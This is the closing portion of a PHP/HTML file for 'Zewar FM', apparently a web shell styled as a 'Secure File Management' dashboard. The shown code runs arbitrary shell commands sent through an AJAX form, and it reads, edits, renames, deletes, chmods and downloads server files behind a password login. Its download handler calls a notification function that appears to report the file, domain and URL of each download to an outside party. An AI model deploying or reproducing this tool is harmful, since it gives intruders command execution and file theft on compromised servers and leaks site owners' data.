<div id="editModal" class="modal"><div class="modal-content" style="max-width:700px"><div class="modal-header"><h3><i class="fas fa-edit"></i> Edit File</h3><button class="modal-close" onclick="closeModal('editModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="filename" id="editFilename"><div class="modal-body"><textarea name="content" id="editContent" rows="12" style="font-family:monospace"></textarea></div><div class="modal-footer"><button type="submit" name="save_file" class="btn btn-primary">Save</button><button type="button" class="btn btn-outline" onclick="closeModal('editModal')">Cancel</button></div></form></div></div>

<script>
function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
function openCommandModal() { openModal('commandModal'); document.getElementById('cmdInput').focus(); document.getElementById('cmdOutput').style.display = 'none'; }
function closeCommandModal() { closeModal('commandModal'); document.getElementById('cmdInput').value = ''; }

async function runCommand() {
    const cmd = document.getElementById('cmdInput').value.trim();
    if (!cmd) { alert('Enter command'); return; }
    const outputDiv = document.getElementById('cmdOutput');
    const outputText = document.getElementById('cmdOutputText');
    outputText.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Running...';
    outputDiv.style.display = 'block';
    try {
        const formData = new FormData();
        formData.append('csrf_token', '<?php echo csrf_token(); ?>');
        formData.append('command', cmd);
        
        const response = await fetch('?ajax_cmd=1', {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        
        if (data.status === 'success') {
            outputText.innerHTML = data.output || '(no output)';
            outputText.className = 'cmd-output';
        } else {
            outputText.innerHTML = '⚠️ ' + (data.output || 'Command failed');
            outputText.className = 'cmd-output error';
        }
    } catch(e) {
        outputText.innerHTML = 'Error: ' + e.message;
        outputText.className = 'cmd-output error';
    }
}

function renameItem(n) { document.getElementById('renameOld').value = n; document.getElementById('renameNew').value = n; openModal('renameModal'); }
function deleteItem(n) { document.getElementById('deleteItem').value = n; document.getElementById('deleteName').innerText = n; openModal('deleteModal'); }
function chmodItem(n, p) { document.getElementById('chmodItem').value = n; let sel = document.getElementById('chmodPerm'); for(let i=0;i<sel.options.length;i++) if(sel.options[i].value === p.replace(/^0/,'')) sel.selectedIndex=i; openModal('chmodModal'); }
async function editFile(n) { try { let res = await fetch('?get_file=1&f=' + btoa(n)); document.getElementById('editFilename').value = n; document.getElementById('editContent').value = await res.text(); openModal('editModal'); } catch(e) { alert('Cannot load file'); } }
document.getElementById('cmdInput')?.addEventListener('keypress', function(e) { if (e.key === 'Enter') runCommand(); });
window.onclick = function(e) { if (e.target.classList.contains('modal')) e.target.classList.remove('active'); }
function showToast(msg, type) { let t = document.getElementById('toast'); if(!t){ t=document.createElement('div'); t.id='toast'; t.className='toast'; document.body.appendChild(t); } t.className=`toast ${type} show`; t.innerHTML=msg; setTimeout(()=>t.classList.remove('show'),3000); }
<?php if ($message): ?>showToast('<?php echo addslashes($message); ?>', '<?php echo $toast_type; ?>');<?php endif; ?>
</script>
</body>
</html>
<?php
// Download handler
if (isset($_GET['download']) && isset($_GET['f'])) {
    $file = sanitize_filename(base64_decode($_GET['f']));
    if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
        $relative_path = str_replace($document_root, '', $current);
        send_secure_notification('DOWNLOAD', [
            'File Name' => $file,
            'File Size' => format_size(filesize($current . '/' . $file)),
            'Directory' => $relative_path,
            'Domain' => get_current_domain(),
            'URL' => get_current_url()
        ]);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($current . '/' . $file));
        readfile($current . '/' . $file);
        exit;
    }
}
// Get file content
if (isset($_GET['get_file']) && isset($_GET['f'])) {
    $file = sanitize_filename(base64_decode($_GET['f']));
    if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
        echo file_get_contents($current . '/' . $file);
    }
    exit;
}

function get_login_page($error = '') {
    $csrf = bin2hex(random_bytes(32));
    $_SESSION['csrf_token'] = $csrf;
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Zewar FM - Login</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Inter",sans-serif;min-height:100vh;background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 100%);display:flex;justify-content:center;align-items:center}.login-card{background:rgba(20,20,30,0.95);backdrop-filter:blur(10px);border-radius:24px;padding:40px;width:100%;max-width:400px;border:1px solid rgba(255,215,0,0.3);box-shadow:0 20px 60px rgba(0,0,0,0.5)}.login-card h1{font-size:2rem;background:linear-gradient(135deg,#ffd700,#b800ff);-webkit-background-clip:text;background-clip:text;color:transparent;text-align:center;margin-bottom:10px}.login-card p{text-align:center;color:#aaa;margin-bottom:30px}.input-group{margin-bottom:20px}.input-group input{width:100%;padding:14px 18px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,215,0,0.3);border-radius:12px;color:#fff;font-size:1rem;transition:all 0.3s}.input-group input:focus{outline:none;border-color:#ffd700;background:rgba(255,255,255,0.12)}button{width:100%;padding:14px;background:linear-gradient(135deg,#ffd700,#b800ff);border:none;border-radius:12px;color:#000;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.2s}button:hover{transform:translateY(-2px)}.error{background:rgba(255,59,48,0.2);border-left:4px solid #ff3b30;padding:12px;border-radius:8px;margin-top:20px;text-align:center;color:#ff6b6b}</style></head><body><div class="login-card"><h1>🔐 Zewar FM</h1><p>Secure File Management</p><form method="POST"><input type="hidden" name="csrf_token" value="' . $csrf . '"><div class="input-group"><input type="password" name="password" placeholder="Enter Password" required autofocus></div><button type="submit">Access Dashboard</button>' . ($error ? '<div class="error">' . htmlspecialchars($error) . '</div>' : '') . '</form></div></body></html>';
}
?>
